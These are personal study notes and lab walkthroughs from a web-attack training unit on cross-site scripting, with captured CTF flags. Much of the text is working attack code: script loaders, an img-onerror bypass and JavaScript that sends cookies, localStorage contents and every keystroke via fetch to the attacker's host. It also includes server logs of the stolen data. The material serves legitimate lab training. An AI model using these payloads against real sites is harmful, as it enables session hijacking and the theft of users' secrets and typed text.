This Learning Unit covers the following Learning Objectives:

1. Load XSS payloads from external resources
2. Exfiltrate secrets loaded in a browser's local storage
3. Log a victim's keystrokes
4. Exfiltrate saved passwords from a password manager
5. Phish a user in a realistic way

Historically, attackers have used cross-site scripting vulnerabilities to steal session cookies from authenticated users. However, increased mitigations (most notably, theÂ [_HttpOnly_Â attribute](https://owasp.org/www-community/HttpOnly)Â on session cookies) have limited these attacks. As this limitation prevents only one vector of exploitation, we have many other vectors that we can choose to exploit.

For example, since browsers automatically authenticate requests from a user, we could use this feature to ride a user's session and conduct actions on their behalf, such as changing their password or downloading sensitive information. However, this usually requires a whitebox approach, an existing user account, or intimate knowledge of the application. For this reason, we won't focus on specific application-based exploits and instead, we'll use XSS to steal session tokens (and demonstrate how a session token with HttpOnly is not accessible) and extract data from the local storage.

We can also attack the user by logging keystrokes, extracting saved passwords from a password manager, or phishing the user. These types of attacks are independent of the application and will work on almost all applications, as long as there is something worthwhile to exploit.

-------------
#### 5.1.1. Accessing The Sandbox

For now, we can start the XSS Sandbox machine listed below and make the corresponding IP address update on our Kali machine before starting our work. We'll use this VM in this Learning Unit.

------------------
#### 5.1.2 Moving the Payload to an External Resource
The exploits we discuss here will be more complicated than an alert box. For this reason, we need to use a payload that can deliver a more complicated exploit. While it is possible to write a single line exploit to inject into the application, it's better to inject an HTMLÂ _script_Â tag, which loads the full JavaScript from our Kali machine, as it will let us write more complicated JavaScript without encoding.

Let's demonstrate this by exploiting the Search application in the XSS Sandbox. For now, we'll still stick to the alert exploit, but this will be updated in the upcoming sections.

Instead of using inline JavaScript, we'll add a script tag and set theÂ _src_Â attribute to a file hosted on our Kali machine. This will make the payloadÂ `<script src="http://<KALI_IP>/xss.js"></script>`. We'll also need to make a file calledÂ xss.jsÂ on our Kali machine and host it. We'll use Python's built in HTTP server to host the file.

We'll serve everything in a directory namedÂ xss, which can be found in our home directory. TheÂ xss.jsÂ file will only contain an "alert" instruction. Finally, we'll start the HTTP server withÂ python3 -m http.server 80.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:23:23]-[/home/kali/SUT]
â””â”€# mkdir xss

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:23:25]-[/home/kali/SUT]
â””â”€# cd xss
echo "alert(1)" > xss.js

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Now that the server is started, let's use the payload to exploit the search application with the script below:
```js
<script src="http://192.168.45.222:8000/xss.js"></script>
```
The payload will append a script element to the HTML document and the script tag will load theÂ `xss.js`Â file from our Kali machine. Let's submit the search and exploit the XSS.
![[Pasted image 20240731162755.png]]
After Search
![[Pasted image 20240731162838.png]]
After hitting ok the `script` is rendered on the attacker side it becomes encoded
![[Pasted image 20240731163144.png]]
Once its encoded, render on the victim and now we receive the alert output
![[Pasted image 20240731163309.png]]
I am supposed to see traffic in the `python3 -m http.server 80`, but i dont - however it is working.
![[Pasted image 20240731163815.png]]
After looking at burpsuite, due to my proxy being setup it seems that It is getting the get request but isnt because the referer maybe?
![[Pasted image 20240731163932.png]]
Ok nvm - python server was lagging - the 304 is the upload to the server side, the 200 is the victim rendering the page
![[Pasted image 20240731164447.png]]
We find two entries in the HTTP server logs. The first is from our own Kali IP when we loaded the page ourselves. The second is from the victim's browser.

We'll use the script element payload and the search application for the remainder of the exploits. However, this payload can't be used for any other XSS styles that won't automatically execute JavaScript (for example, client XSS vulnerabilities that useÂ _innerHTML_). Fortunately, there are other methods to get around this restriction.


------------------
#### 5.1.3 Stealing Session Cookies
The age-old goal of cross-site scripting has always been to exfiltrate the user's session cookie. When obtained, we can use the session cookie to authenticate to the application as the victim, but the increased use of theÂ _HttpOnly_Â attribute has made this exploit less prevalent. However, it is still important for us to understand how the exploit works and how an application responds when theÂ _HttpOnly_Â attribute is set.

Using JavaScript, we can access the cookies of a page using theÂ `document.cookie`Â property. We'll extract this value, URL encode it, and useÂ _fetch_Â to send it back to our Kali VM. All of this will be done in theÂ xss.jsÂ file.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss2.js     

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss2.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.223/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

As shown above, we edited theÂ xss2.jsÂ file to extract and encode the cookie and send a GET request back to our Kali VM with the encoded value. We'll paste the script payload into the Search application and submit the payload.

```js
<script src="http://192.168.45.223:80/xss2.js"></script>
```
This is an example of what the field that we enter the script in looks like
![[Pasted image 20240731180352.png]]
Submitted the script above and it got rendered
![[Pasted image 20240731174739.png]]
python3 server pulling it back
![[Pasted image 20240731174856.png]]
As shown in Listing 3, we edited theÂ xss2.jsÂ file to extract and encode the cookie and send a GET request back to our Kali VM with the encoded value. We'll paste the script payload into the Search application and submit the payload.

![[Pasted image 20240731175651.png]]
Again, we'll "exploit" ourselves but since we don't have cookie set, the log in our HTTP server will be empty.
![[Pasted image 20240731175827.png]]
We can safely ignore the 404 error correctly stating that the "exfil" file doesn't exist because finding this log means that the data was exfiltrated.
Next, let's have the victim run this page. This time, we'll check the box titled "Use Non-HttpOnly Cookie" and then clickÂ _Render_.
![[Pasted image 20240731175929.png]]
The page loads normally, but if we check our HTTP log, we can find a cookie value that was exfiltrated!
![[Pasted image 20240731180109.png]]
Excellent! However, let's uncheck the "Use Non-HttpOnly Cookie" and check "Use HttpOnly Cookie" instead. When we clickÂ _Render_, the page loads normally again, but if we check the log, we don't find a cookie.
![[Pasted image 20240731180151.png]]
![[Pasted image 20240731180215.png]]
When a cookie is set with the HttpOnly flag, JavaScript cannot access it so we can't exfiltrate its value. This is how XSS can be mitigated
##### Labs
###### 1
![[Pasted image 20240731181939.png]]
When first browsing to the `Donate` tab, I notice that `Samantha` is tied to the URL
![[Pasted image 20240731182057.png]]
Immediately I know that when `XSS` is utilized it is typically rendered in `URL-Encoding` so i took my payload from the previous exercises and url encoded it
Before Encoding:
```js
<script src="http://192.168.45.223:80/xss2.js"></script>
```
After `URL-Encoding`
```js
%3Cscript%20src%3D%22http%3A%2F%2F192.168.45.223%3A80%2Fxss2.js%22%3E%3C%2Fscript%3E
```
![[Pasted image 20240731182333.png]]
Insert it in the `name=` field, hit enter and rendered on the `victim` side
![[Pasted image 20240731182447.png]]
In the `python3` server you can see that the blue is from us exploiting ourselves on the left side of the screen, and the yellow is the actual cookie
![[Pasted image 20240731182637.png]]
Throwing the cookie into a `URL-Decoder` presents the flag
`flag%3DOS%7Bc506a15c451370f390df8bee42cb6963%7D`
![[Pasted image 20240731182748.png]]
`OS{c506a15c451370f390df8bee42cb6963}`

###### 2
![[Pasted image 20240731185324.png]]
Entered `jorden` and the number `1` into the starting field, upon hitting submit was able to identify `id` as a potential exploitable field
![[Pasted image 20240731183100.png]]
Going to try both payloads
Before Encoding:
```js
<script src="http://192.168.45.223:80/xss2.js"></script>
```
After `URL-Encoding`
```js
%3Cscript%20src%3D%22http%3A%2F%2F192.168.45.223%3A80%2Fxss2.js%22%3E%3C%2Fscript%3E
```
After trying both the numerical field is unable to process the request in both `URL-Encoding` and `js`
![[Pasted image 20240731183259.png]]
back on the main `RSVP` page before any input has been submitted, inspected the page and found the `number` file that needs to be changed to text to allow processing
![[Pasted image 20240731183600.png]]
Right clicked `edit HTML` and changed it to `text`
![[Pasted image 20240731183714.png]]
After editing the HTML I was able to input the payload successfully
`<script src="http://192.168.45.223:80/xss2.js"></script>`
The payload was submitted where the green is for guests
![[Pasted image 20240731184641.png]]
this gave back the error that shows that it is working from the attacker host in the `python3` server
![[Pasted image 20240731184758.png]]
Once we saw that worked, we then tested the payload on the victim machine and got the same empty field in the `Guests`
![[Pasted image 20240731185010.png]]
Now, when we check the `python3 http.server 80` we see the `200` request as well as the flag - or the cookie from the Non HTTP only cookie
![[Pasted image 20240731185125.png]]
Decoding the flag
`OS{61eef285ddb9ee6ac77f8f21510fa83d}`
![[Pasted image 20240731185246.png]]

###### 3
![[Pasted image 20240801211646.png]]
We are unable to execute because the `innerHTML` method being implemented so we are forced to translate the original payload into a payload that bypasses the method

Original
```html
<script src="http://192.168.45.223:80/xss2.js"></script>
```
Converted utilizing the `img` tag and `onerror`  with chatgpt
```bash
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.223:80/xss2.js\'><\/script>');" />
```
Placing the new script into the `List` applications vulnerable field and playing with the spaces between `,` until it accepts the input pushes it to this default screen
![[Pasted image 20240801205526.png]]
but if we check the `python3 http.server` that we opened, we can see that it worked by attempting to grab it
![[Pasted image 20240801205607.png]]
Now in order to exploit it, it is kinda a race condition because you have to put the new script in the field hit share, and copy the `csv` code that gets spit out before it whites out the screen.
![[Pasted image 20240801212817.png]]
`csv` conversion  dont once hitting share
```bash
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0ibm9uZXhpc3RlbnQuanBnIiBvbmVycm9yPSJ0aGlzLm9uZXJyb3I9bnVsbDtkb2N1bWVudC53cml0ZSgnPHNjcmlwdCBzcmM9XCdodHRwOi8vMTkyLjE2OC40NS4yMjM6ODAveHNzMi5qc1wnPjxcL3NjcmlwdD4nKTsiIC8%2BLFNhbWFudGhhLDEK
```
once you get the `csv` payload, you put it into the url and hit search, hit render and the victim will be in a forever loop of loading
![[Pasted image 20240801211257.png]]
If we check the `python3 -m http.server 80` and we see the flag
![[Pasted image 20240801211453.png]]
Decode the string using a `URL Decoder` and we will have the flag
![[Pasted image 20240801211612.png]]
`OS{98256e4b119800c9ed4a67a899f32538}`

###### 4
![[Pasted image 20240801213608.png]]
Go to the `ToDo` section, insert the payload below
```html
<script src="http://192.168.45.223:80/xss2.js"></script>
```
render the page on the victim side
![[Pasted image 20240801213227.png]]
check `python3 -m http.server 80` and profit
![[Pasted image 20240801213402.png]]
translate the flag with a `URL decoder`
```bash
flag%3DOS%7B58256e4b119800c9ed4a67a899f32538%7D
```
![[Pasted image 20240801213511.png]]
`OS{58256e4b119800c9ed4a67a899f32538}`

------------------
#### 5.1.4 Stealing Local Secrets
Web applications have the ability to store data in a user's browser, a feature typically used to store larger amounts of data. For example, an application that lets us edit documents might store the document locally in the browser as a cache before it's sent to the server to be saved. This ensures that even if the user closes the tab, they don't lose their data. However, local storage might also contain secrets like API keys or personal user information.

There are two types of storage available to us:Â [_sessionStorage_](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)Â andÂ [_localStorage_](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage). The only difference between the two is the level of persistence. While localStorage will keep the data until explicitly deleted, sessionStorage will keep the data until the tab is closed. The localStorage data can be accessed by using theÂ _window.localStorage_Â property, while sessionStorage can be accessed withÂ _window.sessionStorage_.

To exfiltrate `localStorage`, we'll convert the object into a string, URL encode the string, and useÂ _fetch_Â to send the data back to us.

```
â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:17]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss3.js   

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:49]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss3.js   
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.223/exfil?data=" + encodedData)

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:57]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Payload to test against own kali machine 1st
```bash
<script src="http://192.168.45.223:80/xss3.js"></script>
```

![[Pasted image 20240802092446.png]]
Upon hitting `search` it gets translated to URL Encoding
![[Pasted image 20240802092609.png]]
Checking the `python3 -m http.server 80` we can see that the payload work
![[Pasted image 20240802092753.png]]
Now since we know that the payload works, check `Data in Local Storage` and hit `Render`
![[Pasted image 20240802093228.png]]
Check the `python3 -m http.server` and can see that the `localStorage` token was sent
![[Pasted image 20240802093357.png]]

##### Labs
###### 1 
![[Pasted image 20240802095228.png]]
Payload to test against own kali machine 1st to ensure worked
```bash
<script src="http://192.168.45.223:80/xss3.js"></script>
```
Placed the payload in the `name=` variable and got translated to `URL-Encoding`
![[Pasted image 20240802093900.png]]
Can see that it worked
![[Pasted image 20240802094024.png]]
Rendering from the victim
![[Pasted image 20240802094211.png]]
This renders the flag
![[Pasted image 20240802094515.png]]
use `URL-Decoder`
```bash
data=%7B%22FLAG%22%3A%22OS%7Bc5d0e39f1077197d81f889bd22c09f42%7D%22%7D
```
![[Pasted image 20240802095028.png]]
```
OS{c5d0e39f1077197d81f889bd22c09f42}
```
###### 2
![[Pasted image 20240802103443.png]]

Start on this webpage and edit `type=number` to `type=text` with the `Edit as HTML` function
![[Pasted image 20240802095754.png]]
Enter the `script` into the `guest` field and hit enter
```bash
<script src="http://192.168.45.223:80/xss3.js"></script>
```
If the guest field is empty, that means it worked
![[Pasted image 20240802100421.png]]
when looking at the `python3 http.server` we can see that it got results
![[Pasted image 20240802100516.png]]
Now set `Data in Local Storage` - hit `render`
![[Pasted image 20240802101635.png]]
Check `python3 -m http.server` - profit
![[Pasted image 20240802102739.png]]
Decodethe `URL-Encoding`
```
%7B%22FLAG%22%3A%22OS%7Be5eaa331805d532c12a0477b4d8d9eea%7D%22%7D
```
![[Pasted image 20240802103352.png]]
```bash
OS{e5eaa331805d532c12a0477b4d8d9eea}
```

###### 3
![[Pasted image 20240802141940.png]]
the script doesn't work straight up because of the `innerHTML` method
![[Pasted image 20240802103813.png]]
Utilizing `Firefox` to analyze the network packets in `list.js` shows that `innerHTML` is implemented
![[Pasted image 20240802105055.png]]
this means that we have to translate the original script to an `img` utilizing `onerror` to allow it to work.

Original Script:
```html
<script src="http://192.168.45.223:80/xss3.js"></script>
```
Modified Script (Working) Had to ensure that the `"` were changed to `'` before the script worked
```html
<img src="x" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.223:80/xss3.js\'></script>');" />
```

Once submitted, the screen goes blank
![[Pasted image 20240802134805.png]]
If you check the `python3 http.server 80` we can see a hit
![[Pasted image 20240802135643.png]]
In order to get it to work, you ave to bat the race condition and get the csv encoding
![[Pasted image 20240802140754.png]]
```
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0ieCIgb25lcnJvcj0idGhpcy5vbmVycm9yPW51bGw7ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPVwnaHR0cDovLzE5Mi4xNjguNDUuMjIzOjgwL3hzczMuanNcJz48L3NjcmlwdD4nKTsiIC8%2BLFNhbWFudGhhLDEK
```
Now once you insert the `csv` string into the url and render a flag will come back in the `python3 http.server` 
- If you see the `loading page` means that it probably worked.
![[Pasted image 20240802141138.png]]
Checking the `python3 server`
![[Pasted image 20240802141451.png]]
And decode
![[Pasted image 20240802141803.png]]
`OS{a5014a1243addd902fe8da8f7c582811}`

###### 4
![[Pasted image 20240802143455.png]]
Working Payload
```html
<img src="x" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.223:80/xss3.js\'></script>');" />
```
Submit the payload in here (diffidult to show because the screen changes quickly)
![[Pasted image 20240802142939.png]]
Once the payload is submitted, render and profit
![[Pasted image 20240802142659.png]]
Open `python3 -m http.server` and see the flag
![[Pasted image 20240802143149.png]]
Decode 
![[Pasted image 20240802143335.png]]

------------------
#### 5.1.5 Keylogging
At times, attacking the application might not be the best course of action. If the user of the site is the larger target, it might be better to target the user instead. Keylogging is one of the best cross-site scripting methods to target users with as it's very difficult for a user to detect, but very effective in exfiltrating secrets.

Keylogging with XSS is limited though. We are able to keylog by creating an event listener for any keystroke, but it can only be set on the current document. That means if the user is on a different tab or in a different application, we won't be able to intercept their keystrokes. However, if the user is typing a private message or attempting to log in on our target site, we can capture those events.

The JavaScript event for keypresses isÂ _keydown_, which will be passed into theÂ _addEventListener_Â function. This function also accepts a callback function to run for each keydown event. Within this function, we'll send the key that was pressed back to our server.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:14:45]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss4.js

# Make sure to change the IP address
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:09]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss4.js 
function logKey(event){
        fetch("http://192.168.45.236/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:50]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In the search option on the website drop the payload and hit search
payload
```bash
<script src="http://192.168.45.236:80/xss4.js"></script>
```
![[Pasted image 20240805154411.png]]
Pressing `Search` translates the script into `URL-Encoding`  
![[Pasted image 20240805154534.png]]
A `Get` request should pop in the `python server`
![[Pasted image 20240805154632.png]]
Once that happens hit `Render` and `Simulate keystrokes`

`"Divorce Lawyer Near Me"`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:41:34]-[/home/kali/SUT/OSWA/xss]                                                                                             
â””â”€# python3 -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                                                                                      
192.168.45.236 - - [05/Aug/2024 19:41:39] "GET /xss4.js HTTP/1.1" 304 -                                                                                       
192.168.240.101 - - [05/Aug/2024 19:41:48] "GET /xss4.js HTTP/1.1" 200 -                                                                                      
192.168.240.101 - - [05/Aug/2024 19:41:48] code 404, message File not found                                                                                   
192.168.240.101 - - [05/Aug/2024 19:41:48] "GET /k?key=D HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:48] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:48] "GET /k?key=i HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:49] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:49] "GET /k?key=v HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:49] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:49] "GET /k?key=o HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:49] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:49] "GET /k?key=r HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:49] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:49] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:50] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:50] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:50] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:50] "GET /k?key= HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:50] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:50] "GET /k?key=L HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:50] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:50] "GET /k?key=a HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:50] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:50] "GET /k?key=w HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=y HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=r HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key= HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=N HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=r HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key= HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:51] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:51] "GET /k?key=N HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key=a HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key=r HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key= HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:52] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:52] "GET /k?key=M HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:41:53] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:41:53] "GET /k?key=e HTTP/1.1" 404 -

```

##### Labs
![[Pasted image 20240805164438.png]]
use the `payload` in the `Donate tab` under the `name=` variable, once submitted it will be changed to `URL-Encoding` hit `Search` and `Render` with the `Simulate Keystrokes` option selected
```bash
<script src="http://192.168.45.236:80/xss4.js"></script>
```
![[Pasted image 20240805155212.png]]
Rendering
![[Pasted image 20240805155040.png]]
Check `python3 server` for flag `OS{`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:48:32]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=O HTTP/1.1" 404 -                                                                                      
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found                                                                                   
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=S HTTP/1.1" 404 -                                                                                      
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key={ HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=a HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=3 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:05] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:05] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=8 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:06] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:06] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=7 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=5 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:07] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:07] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=4 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=e HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:08] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:08] "GET /k?key=1 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=c HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=0 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=9 HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:09] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:09] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=b HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=f HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:10] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:10] "GET /k?key=} HTTP/1.1" 404 -

```
Flag portion
```bash
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=O HTTP/1.1" 404 -                                                                                      
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found                                                                                   
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key=S HTTP/1.1" 404 -                                                                                      
192.168.240.101 - - [05/Aug/2024 19:49:03] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:03] "GET /k?key={ HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=a HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=d HTTP/1.1" 404 -
192.168.240.101 - - [05/Aug/2024 19:49:04] code 404, message File not found
192.168.240.101 - - [05/Aug/2024 19:49:04] "GET /k?key=1 HTTP/1.1" 404 -
